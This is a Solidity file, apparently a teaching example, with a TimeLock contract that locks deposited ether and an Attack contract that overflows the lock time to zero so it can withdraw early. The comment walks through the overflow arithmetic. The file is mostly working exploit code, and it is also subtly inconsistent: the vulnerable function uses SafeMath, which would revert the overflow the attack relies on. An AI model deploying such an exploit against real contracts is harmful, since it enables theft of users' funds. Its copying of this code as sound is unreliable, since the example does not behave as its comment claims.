// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0 ;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/math/SafeMath.sol";
contract TimeLock
{
    using SafeMath for uint256; 
    mapping (address => uint) public balances;
    mapping (address => uint) public lockTime;

    function deposit() external payable 
    { 
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }
    function increaseLockTime (uint _secondsToIncrease) public 
    {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }
    function withdraw () public
    {
        require (balances[msg.sender] > 0, "Insufficients Funds");
        require (block.timestamp > lockTime[msg.sender], "Locktime not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent,) = msg.sender.call {value: amount}("");
        require (sent , "Failed to send ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
